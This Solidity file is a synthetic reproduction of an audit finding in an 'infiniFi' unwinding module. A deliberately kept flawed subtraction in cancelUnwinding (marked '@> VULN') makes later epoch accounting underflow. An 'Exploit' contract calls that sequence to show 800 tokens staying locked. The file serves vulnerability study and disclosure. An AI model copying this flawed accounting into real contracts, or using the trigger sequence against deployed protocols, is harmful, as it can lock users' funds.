// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  infiniFi — cancelUnwinding one epoch after startUnwinding breaks the
    slope and the next epoch underflows (Spearbit / R0bert, March 2025).
    SYNTHETIC, cheatcode-free. Epochs are an integer advanced with
    advanceEpoch(), not a timestamp. The blamed subtraction is verbatim (@> VULN).

    Root cause: the slope is stored at fromEpoch = next epoch. Cancelling when
    currentEpoch == fromEpoch rolls the global point only through earlier
    epochs, then still subtracts rewardWeightDecrease. A decrease that was
    scheduled to end at that epoch no longer fits, so the next
    _getLastGlobalPoint underflows. 800 receipt tokens in the module cannot
    be settled. Cancelling in the start epoch clears the unapplied slope and
    the 800 are paid out. */

contract ReceiptToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract UnwindingModule {
    struct Position {
        uint256 shares;
        uint32 fromEpoch;
        uint32 toEpoch;
        uint256 fromRewardWeight;
        uint256 rewardWeightDecrease;
    }

    struct GlobalPoint {
        uint32 epoch;
        uint256 totalRewardWeight;
        uint256 totalRewardWeightDecrease;
    }

    uint256 public constant SLOPE = 100 ether;
    uint256 public constant LOCKED = 800 ether;
    uint256 public constant ENDING = 150 ether;

    uint32 public currentEpoch = 1;
    uint32 public startedAt;
    GlobalPoint public globalPoint;
    Position public position;
    mapping(uint32 => uint256) public rewardWeightDecreases;
    mapping(uint32 => uint256) public rewardWeightIncreases;
    ReceiptToken public receipt;
    bool public settled;

    constructor(ReceiptToken _receipt) {
        receipt = _receipt;
        globalPoint = GlobalPoint({epoch: 1, totalRewardWeight: 3000 ether, totalRewardWeightDecrease: 200 ether});
        // Another position's slope ends at epoch 2. It fits the stored decrease
        // only if cancel does not subtract the new position's slope early.
        rewardWeightIncreases[2] = ENDING;
    }

    function advanceEpoch() external {
        currentEpoch += 1;
    }

    function startUnwinding() external {
        startedAt = currentEpoch;
        position = Position({
            shares: 1000 ether,
            fromEpoch: currentEpoch + 1,
            toEpoch: currentEpoch + 5,
            fromRewardWeight: 1000 ether,
            rewardWeightDecrease: SLOPE
        });
        rewardWeightDecreases[currentEpoch + 1] += SLOPE;
        rewardWeightIncreases[currentEpoch + 5] += SLOPE;
    }

    function cancelUnwinding() external {
        Position memory pos = position;
        require(pos.toEpoch > 0 && currentEpoch < pos.toEpoch, "not unwinding");
        require(currentEpoch >= pos.fromEpoch, "not started");
        uint256 elapsed = currentEpoch - pos.fromEpoch;
        uint256 userRewardWeight = pos.fromRewardWeight - elapsed * pos.rewardWeightDecrease;
        GlobalPoint memory point = _getLastGlobalPoint();
        // @> VULN: fromEpoch has not been rolled in, but its slope is subtracted anyway.
        point.totalRewardWeightDecrease -= pos.rewardWeightDecrease;
        point.totalRewardWeight -= userRewardWeight;
        _updateGlobalPoint(point);
        rewardWeightIncreases[pos.toEpoch] -= pos.rewardWeightDecrease;
        delete position;
    }

    /// Cancel during the start epoch, before fromEpoch. Drop the unapplied slope.
    function cancelSameEpoch() external {
        require(currentEpoch == startedAt, "same epoch");
        Position memory pos = position;
        require(currentEpoch < pos.fromEpoch, "slope due");
        GlobalPoint memory point = globalPoint;
        point.totalRewardWeight -= pos.fromRewardWeight;
        globalPoint = point;
        rewardWeightDecreases[pos.fromEpoch] = 0;
        rewardWeightIncreases[pos.toEpoch] = 0;
        delete position;
    }

    function settle(address to) external {
        GlobalPoint memory point = _getLastGlobalPoint();
        point.epoch;
        uint256 amount = receipt.balanceOf(address(this));
        require(amount == LOCKED, "rewards");
        require(receipt.transfer(to, amount), "pay");
        settled = true;
    }

    function _getLastGlobalPoint() internal view returns (GlobalPoint memory point) {
        point = globalPoint;
        for (uint32 epoch = point.epoch; epoch < currentEpoch; epoch++) {
            point.totalRewardWeightDecrease -= rewardWeightIncreases[epoch];
            point.totalRewardWeightDecrease += rewardWeightDecreases[epoch];
            point.totalRewardWeight -= point.totalRewardWeightDecrease;
            point.epoch = epoch + 1;
        }
    }

    function _updateGlobalPoint(GlobalPoint memory point) internal {
        globalPoint = point;
    }
}

contract Exploit {
    ReceiptToken public receipt; // nonce 1
    UnwindingModule public book; // nonce 2
    uint256 public stuck;
    uint256 public paid;
    bool public settleReverted;

    constructor() {
        receipt = new ReceiptToken();
        book = new UnwindingModule(receipt);
    }

    function run() external {
        book.startUnwinding();
        receipt.mint(address(book), book.LOCKED());
        book.advanceEpoch();
        book.cancelUnwinding();
        book.advanceEpoch();
        try book.settle(msg.sender) {
            settleReverted = false;
        } catch {
            settleReverted = true;
        }
        stuck = receipt.balanceOf(address(book));
        paid = receipt.balanceOf(msg.sender);
        require(book.currentEpoch() == 3, "not the following epoch");
        require(settleReverted, "settle did not revert");
        require(stuck == book.LOCKED(), "800 did not stay locked");
        require(paid == 0, "caller was paid");
    }
}
